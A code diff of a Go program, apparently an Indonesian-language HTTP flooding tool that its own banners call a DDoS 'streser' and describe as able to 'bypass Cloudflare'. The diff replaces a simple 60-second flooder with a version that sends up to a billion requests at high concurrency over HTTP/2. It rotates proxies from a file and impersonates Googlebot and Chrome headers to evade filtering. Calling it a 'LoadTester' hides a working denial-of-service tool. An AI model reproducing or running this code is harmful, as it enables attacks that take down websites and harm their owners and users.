@@ -1,161 +1,378 @@
 package main
 
 import (
-	"bufio"
+	"context"
 	"encoding/json"
+	"flag"
 	"fmt"
+	"io/ioutil"
+	"log"
+	"math/rand"
 	"net"
 	"net/http"
+	"net/url"
 	"os"
-	"os/exec"
-	"runtime"
+	"os/signal"
 	"strings"
 	"sync"
 	"sync/atomic"
+	"syscall"
 	"time"
-)
-
-var (
-	startTime   = time.Now()
-	requests    int64
-	concurrency = 550
+	"golang.org/x/net/http2"
 )
 
 const (
-	P = "\033[0m"
-	R = "\033[31m"
-	G = "\033[32m"
-	Y = "\033[33m"
-	C = "\033[36m"
+	RESET  = "\033[1;0m"
+	HIJAU  = "\033[1;92m"
+	MERAH  = "\033[1;91m"
+	KUNING = "\033[1;93m"
+	UNGU   = "\033[1;95m"
+	CYAN   = "\033[1;96m"
 )
 
-func banner() {
-	fmt.Println(P + `
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣀⡠
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣧
-⠀⠀⠀⠀⠀⠀⠈⠀⠄⠀⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈ [ # ] Dizflyze
-⠀⠀⠀⠀⢀⣁⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢋⣭⡍⣿⣿⣿⣿⣿⣿⠐ [ # ] DOS
-⠀⢀⣴⣶⣶⣝⢷⡝⢿⣿⣿⣿⠿⠛⠉⠀⠂⣰⣿⣿⢣⣿⣿⣿⣿⣿⣿⡇ [ # ] v1.3.2
-⢀⣾⣿⣿⣿⣿⣧⠻⡌⠿⠋⠡⠁⠈⠀⠀⢰⣿⣿⡏⣸⣿⣿⣿⣿⣿⣿⣿ [ # ] 23 JAN
-⣼⣿⣿⣿⣿⣿⣿⡇⠁⠀⠀⠐⠀⠀⠀⠀⠈⠻⢿⠇⢻⣿⣿⣿⣿⣿⣿⡟
-⠙⢹⣿⣿⣿⠿⠋⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⡿⠟⠁
-⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-` + P)
+func Putih(text string) string { return "\033[1;97m" + text + RESET }
+func Hijau(text string) string  { return HIJAU + text + RESET }
+func Merah(text string) string  { return MERAH + text + RESET }
+func Kuning(text string) string { return KUNING + text + RESET }
+func Ungu(text string) string   { return UNGU + text + RESET }
+func Cyan(text string) string   { return CYAN + text + RESET }
+
+type LoadTester struct {
+	Link             string
+	numRequests      int64
+	concurrency      int
+	timeout          time.Duration
+	method           string
+	headers          map[string]string
+	proxies          []string
+	successCount     int64
+	failureCount     int64
+	sentCount        int64
+	totalLatency     int64
+	lastResponseCode string
+	client           *http.Client
 }
 
-func getISP(ip string) (string, string, string) {
-	client := &http.Client{Timeout: 5 * time.Second}
-	resp, err := client.Get("http://ip-api.com/json/" + ip)
+func NewLoadTester(Link string, numRequests int64, concurrency int, timeout time.Duration, method string, headers map[string]string, proxies []string) *LoadTester {
+	var proxyFunc func(*http.Request) (*url.URL, error)
+	if len(proxies) > 0 {
+		proxyFunc = func(req *http.Request) (*url.URL, error) {
+			proxyStr := proxies[rand.Intn(len(proxies))]
+			return url.Parse(proxyStr)
+		}
+	}
+	transport := &http.Transport{
+		Proxy:               proxyFunc,
+		MaxIdleConns:        50000,
+		MaxIdleConnsPerHost: 50000,
+		IdleConnTimeout:     2 * time.Second,
+		TLSHandshakeTimeout: 2 * time.Second,
+		DialContext: (&net.Dialer{
+			Timeout:   2 * time.Second,
+			KeepAlive: 2 * time.Second,
+			DualStack: true,
+		}).DialContext,
+	}
+	if err := http2.ConfigureTransport(transport); err != nil {
+		log.Fatalf("Gagal mengonfigurasi HTTP/2: %v", err)
+	}
+	client := &http.Client{
+		Transport: transport,
+		Timeout:   timeout,
+	}
+	return &LoadTester{
+		Link:        Link,
+		numRequests: numRequests,
+		concurrency: concurrency,
+		timeout:     timeout,
+		method:      method,
+		headers:     headers,
+		proxies:     proxies,
+		client:      client,
+	}
+}
+
+func (lt *LoadTester) sendRequest(ctx context.Context) {
+	startTime := time.Now()
+	req, err := http.NewRequestWithContext(ctx, lt.method, lt.Link, nil)
 	if err != nil {
-		return "Unknown", "Unknown", "Unknown"
+		atomic.AddInt64(&lt.failureCount, 1)
+		lt.lastResponseCode = "ERROR"
+		return
+	}
+	for k, v := range lt.headers {
+		req.Header.Set(k, v)
+	}
+	resp, err := lt.client.Do(req)
+	latency := time.Since(startTime)
+	atomic.AddInt64(&lt.totalLatency, latency.Nanoseconds())
+	if err != nil {
+		atomic.AddInt64(&lt.failureCount, 1)
+		lt.lastResponseCode = "ERROR"
+		return
 	}
 	defer resp.Body.Close()
-
-	var data struct {
-		Country string `json:"country"`
-		Org     string `json:"org"`
-		AS      string `json:"as"`
+	lt.lastResponseCode = fmt.Sprintf("%d", resp.StatusCode)
+	if resp.StatusCode == 200 {
+		atomic.AddInt64(&lt.successCount, 1)
+	} else {
+		atomic.AddInt64(&lt.failureCount, 1)
 	}
-	json.NewDecoder(resp.Body).Decode(&data)
-	return data.Org, data.AS, data.Country
 }
 
-func resolveHost(host string) string {
-	ips, _ := net.LookupIP(host)
-	if len(ips) > 0 {
-		return ips[0].String()
-	}
-	return "Unknown"
-}
-
-func attack(url string, client *http.Client, stop <-chan struct{}, wg *sync.WaitGroup) {
+func (lt *LoadTester) run(ctx context.Context, wg *sync.WaitGroup) {
 	defer wg.Done()
-	req, _ := http.NewRequest("GET", url, nil)
+	sem := make(chan struct{}, lt.concurrency)
+	var innerWg sync.WaitGroup
+	for i := int64(0); i < lt.numRequests; i++ {
+		select {
+		case <-ctx.Done():
+			break
+		default:
+		}
+		sem <- struct{}{}
+		innerWg.Add(1)
+		atomic.AddInt64(&lt.sentCount, 1)
+		go func() {
+			defer func() {
+				<-sem
+				innerWg.Done()
+			}()
+			lt.sendRequest(ctx)
+		}()
+	}
+	innerWg.Wait()
+}
 
+func printLogo() {
+	logo := "" +
+		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣄⡀\n" +
+		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣷⡀\n" +
+		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧\n" +
+		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿\n" +
+		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⡿⠃\n" +
+		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⠿⠿⠿⠟⠋\n" +
+		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣶⣿⣿⣶⣄\n" +
+		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣷\n" +
+		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n" +
+		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n" +
+		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n" +
+		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀\n" +
+		"⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣾⣿⣶⣶⣤⡀\n" +
+		"⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠘⢿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄\n" +
+		"⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠈⠻⣿⣿⣿⣿⣆⠀⠀⠀⢀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n" +
+		"⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⣀⣤⣶⣶⣌⠻⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟\n" +
+		"⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⠁⣰⣿⣿⣿⣿⣿⣦⣙⢿⣿⣿⣿⠄⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟\n" +
+		"⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣦⣹⣟⣫⣼⣿⣿⣶⣿⣿⣿⣿⣿⣿⣯⡉⠉⠉⠁\n" +
+		"⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n" +
+		"⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⡆⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n" +
+		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⡇⠀⢻⣿⣿⣿⣿⣿⡇⠀⠀⠈⠉⠉⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠉\n" +
+		"⠀⣠⣴⣶⣶⣶⣶⣶⣶⣾⣿⣿⣿⣿⣿⡇⠀⠸⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠹⢿⣿⣿⢿⣿⣿⣿⡿\n" +
+		"⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢰⣶⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣧⣄⣐⣀⣀⣀⣀⣀⡀\n" +
+		"⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n" +
+		"⠀⠀⠉⠉⠙⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠁⠛⠛⠛⠛⠛⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁\n" +
+		"┌──────                   ┌──────\n" +
+		"  DIZ FLYZE PRIVATE         FAST SEND REQUESTS\n" +
+		"  JATENG X PLOIT V5         6 BYPAS CLOUDFLARE\n" +
+		"              ──────┘                    ──────┘\n"
+	fmt.Println(logo)
+}
+
+func animate(ctx context.Context, lt *LoadTester, initialCycleDuration, summaryDuration, updateInterval time.Duration) {
+	symbols := []string{"▁", "▃", "▄", "▅", "▇"}
+	symbolIndex := 0
+	currentCycleDuration := initialCycleDuration
+	startCycle := time.Now()
+	ticker := time.NewTicker(updateInterval)
+	defer ticker.Stop()
 	for {
 		select {
-		case <-stop:
+		case <-ctx.Done():
 			return
-		default:
-			resp, err := client.Do(req)
-			if err == nil {
-				resp.Body.Close()
-				atomic.AddInt64(&requests, 1)
+		case <-ticker.C:
+			elapsed := time.Since(startCycle)
+			pending := atomic.LoadInt64(&lt.sentCount) - (atomic.LoadInt64(&lt.successCount) + atomic.LoadInt64(&lt.failureCount))
+			done := atomic.LoadInt64(&lt.successCount) + atomic.LoadInt64(&lt.failureCount)
+			var avgLatency int64
+			if done > 0 {
+				avgLatency = atomic.LoadInt64(&lt.totalLatency) / done / 1e6
+			}
+			if elapsed >= currentCycleDuration {
+				total := done
+				summary := fmt.Sprintf("%s %s %s %s %s %s %s %s %s %s %s %s %s %s",
+					    Putih("\n "),
+ 					   Cyan("["),
+					    Putih("DONE"),
+					    Cyan("]"),
+  					  Hijau(":"),
+                        Cyan("["),
+   					 Putih(fmt.Sprintf("%d", int(currentCycleDuration.Seconds()))),
+ 					   Putih("DETIK"),
+                        Cyan("]"),
+   					 Hijau(":"),
+                        Cyan("["),
+  					  Hijau(fmt.Sprintf("%d", total)),
+                        Putih("REQUESTS"),
+                        Cyan("]"),
+		    	)
+				fmt.Println(summary)
+				time.Sleep(summaryDuration)
+				fmt.Print("\033[2A\033[J")
+				currentCycleDuration += 60 * time.Second
+				startCycle = time.Now()
+			} else {
+				remaining := currentCycleDuration - elapsed
+				timerStr := fmt.Sprintf("%02d:%02d", int(remaining.Minutes()), int(remaining.Seconds())%60)
+				line := fmt.Sprintf("%s %s %s %s %s %s %s %s %s %s %s %s %s %s",
+			    	Cyan(symbols[symbolIndex%len(symbols)]),
+			    	Merah("["),
+					Putih("OTW"),
+					Merah("]"),
+					Kuning(":"),
+					Merah("["),
+                    Hijau(timerStr),
+					Merah("]"),
+					Putih("RPS"),
+					Kuning(":"),
+					Hijau(fmt.Sprintf("%d", pending)),
+					Putih("AVG"),
+					Kuning(":"),
+                    Hijau(fmt.Sprintf("%d", avgLatency)),
+				)
+				symbolIndex++
+				fmt.Print("\r" + line)
 			}
 		}
 	}
 }
 
-func parseHost(url string) string {
-	parts := strings.Split(url, "/")
-	if len(parts) >= 3 {
-		return parts[2]
+func loadConfig(configPath string) (map[string]interface{}, error) {
+	data, err := ioutil.ReadFile(configPath)
+	if err != nil {
+		return nil, err
 	}
-	return url
+	var config map[string]interface{}
+	if err := json.Unmarshal(data, &config); err != nil {
+		return nil, err
+	}
+	return config, nil
 }
 
-func setUlimit() {
-	cmd := exec.Command("ulimit", "-n", "65535")
-	cmd.Run()
+func getIP(Link string) string {
+	parsed, err := url.Parse(Link)
+	if err != nil {
+		return "Unknown"
+	}
+	host := parsed.Hostname()
+	addrs, err := net.LookupHost(host)
+	if err != nil || len(addrs) == 0 {
+		return "Unknown"
+	}
+	return addrs[0]
 }
 
 func main() {
-	runtime.GOMAXPROCS(runtime.NumCPU())
-	setUlimit()
-	banner()
-
-	reader := bufio.NewReader(os.Stdin)
-	fmt.Print(P + "╔═[ddos]Dizflyze Streser]\n╚═══➤ " + P)
-	url, _ := reader.ReadString('\n')
-	url = strings.TrimSpace(url)
-
-	duration := 60 * time.Second
-	stop := make(chan struct{})
+	rand.Seed(time.Now().UnixNano())
+	configPath := flag.String("config", "", "FILE JSON")
+	urlFlag := flag.String("url", "", "LINK URL")
+	requestsFlag := flag.Int64("requests", 1000000000, "TOTAL REQUESTS")
+	concurrencyFlag := flag.Int("concurrency", 550, "CONCURRENCY")
+	timeoutFlag := flag.Float64("timeout", 2, "WAKTU SETIAP REQUEST (detik)")
+	methodFlag := flag.String("method", "GET", "HTTP METHOD (GET/POST/ETC)")
+	logFlag := flag.String("log", "ERROR", "DEBUG, INFO, WARNING, ERROR")
+	noLiveFlag := flag.Bool("no-live", false, "MATIKAN LIVE OUTPUT")
+	proxyFile := flag.String("proxy", "", "FILE PROXY")
+	updateIntervalFlag := flag.Float64("update-interval", 0.10, "KECEPATAN LOADING")
+	flag.Parse()
+	if strings.ToUpper(*logFlag) == "DEBUG" {
+		log.SetOutput(os.Stdout)
+	} else {
+		log.SetOutput(os.Stderr)
+	}
+	configData := make(map[string]interface{})
+	if *configPath != "" {
+		conf, err := loadConfig(*configPath)
+		if err != nil {
+			fmt.Printf("ERROR: %v\n", err)
+			os.Exit(1)
+		}
+		configData = conf
+	}
+	Link := *urlFlag
+	if Link == "" {
+		if val, ok := configData["url"].(string); ok {
+			Link = val
+		}
+	}
+	if Link == "" {
+		fmt.Println("JALANKAN GO RUN UNTUK MENGUNAKAN")
+		os.Exit(1)
+	}
+	numRequests := *requestsFlag
+	if val, ok := configData["requests"].(float64); ok {
+		numRequests = int64(val)
+	}
+	concurrency := *concurrencyFlag
+	if val, ok := configData["concurrency"].(float64); ok {
+		concurrency = int(val)
+	}
+	timeoutSec := *timeoutFlag
+	if val, ok := configData["timeout"].(float64); ok {
+		timeoutSec = val
+	}
+	method := strings.ToUpper(*methodFlag)
+	headers := map[string]string{
+		"User-Agent":           "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+		"Accept":               "application/json",
+		"Accept-Encoding":      "gzip, deflate, br",
+		"x-forwarded-proto":    "https",
+		"cache-control":        "no-cache",
+		"sec-ch-ua":            "\"Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"115\", \"Chromium\";v=\"115\"",
+		"sec-ch-ua-mobile":     "?0",
+		"sec-ch-ua-platform":   "Windows",
+		"accept-language":      "en-US,en;q=0.9",
+		"upgrade-insecure-requests": "1",
+	}
+	var proxies []string
+	if *proxyFile != "" {
+		data, err := ioutil.ReadFile(*proxyFile)
+		if err != nil {
+			fmt.Printf("ERROR: %v\n", err)
+			os.Exit(1)
+		}
+		lines := strings.Split(string(data), "\n")
+		for _, line := range lines {
+			trimmed := strings.TrimSpace(line)
+			if trimmed != "" {
+				proxies = append(proxies, trimmed)
+			}
+		}
+	}
+	fmt.Print("\033[H\033[2J")
+	printLogo()
+	lt := NewLoadTester(Link, numRequests, concurrency, time.Duration(timeoutSec*float64(time.Second)), method, headers, proxies)
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
+	sigChan := make(chan os.Signal, 1)
+	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
+	go func() {
+		sig := <-sigChan
+		fmt.Printf("\n%sDATA: %v. OFF TASK%s\n", Merah(""), sig, RESET)
+		cancel()
+	}()
+	var animWg sync.WaitGroup
+	if !*noLiveFlag {
+		animWg.Add(1)
+		go func() {
+			defer animWg.Done()
+			animate(ctx, lt, 60*time.Second, 2*time.Second, time.Duration(*updateIntervalFlag*float64(time.Second)))
+		}()
+	}
 	var wg sync.WaitGroup
-
-	tr1 := &http.Transport{
-		MaxIdleConns:        65535,
-		MaxIdleConnsPerHost: 65535,
-		IdleConnTimeout:     2 * time.Second,
-		DisableKeepAlives:   false,
-	}
-	client1 := &http.Client{Transport: tr1, Timeout: 2 * time.Second}
-
-	tr2 := &http.Transport{
-		MaxIdleConns:        65535,
-		MaxIdleConnsPerHost: 65535,
-		IdleConnTimeout:     2 * time.Second,
-		DisableKeepAlives:   true,
-	}
-	client2 := &http.Client{Transport: tr2, Timeout: 2 * time.Second}
-
-	half := concurrency / 2
-	for i := 0; i < half; i++ {
-		wg.Add(1)
-		go attack(url, client1, stop, &wg)
-	}
-	for i := 0; i < half; i++ {
-		wg.Add(1)
-		go attack(url, client2, stop, &wg)
-	}
-
-	time.Sleep(duration)
-	close(stop)
+	wg.Add(1)
+	go lt.run(ctx, &wg)
 	wg.Wait()
-
-	host := parseHost(url)
-	ip := resolveHost(host)
-	isp, asn, country := getISP(ip)
-
-	fmt.Println(R + "\n╔════════════════════════════════════════════════╗" + P)
-	fmt.Printf("%s│%s Link     : %s%s\n", R, P, Y, url)
-	fmt.Printf("%s│%s Host     : %s%s\n", R, P, Y, host)
-	fmt.Printf("%s│%s IP       : %s%s\n", R, P, Y, ip)
-	fmt.Printf("%s│%s ISP      : %s%s\n", R, P, C, isp)
-	fmt.Printf("%s│%s ASN      : %s%s\n", R, P, C, asn)
-	fmt.Printf("%s│%s Country  : %s%s\n", R, P, C, country)
-	fmt.Printf("%s│%s Duration : %s%s\n", R, P, Y, time.Since(startTime))
-	fmt.Printf("%s│%s Requests : %s%d\n", R, P, G, requests)
-	fmt.Println(R + "╚════════════════════════════════════════════════╝" + P)
+	cancel()
+	animWg.Wait()
+	fmt.Println("\n" + Hijau(">> SUKSES <<"))
 }
